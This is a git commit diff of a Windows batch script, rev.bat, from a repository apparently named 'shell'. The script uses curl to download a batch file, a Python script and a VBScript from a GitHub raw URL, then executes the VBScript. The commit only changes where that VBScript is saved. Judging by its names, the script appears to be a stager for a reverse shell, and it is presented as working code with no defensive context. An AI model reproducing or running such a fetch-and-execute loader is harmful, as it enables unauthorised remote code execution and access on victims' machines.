61f6a24d305804b0190486a867e85e0f72f4868a
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 02:45:54 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,6 +1,6 @@
 @echo off
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat 
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py 
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs 
-call D:\vb.vbs
+curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o vb.vbs 
+call vb.vbs
 exit
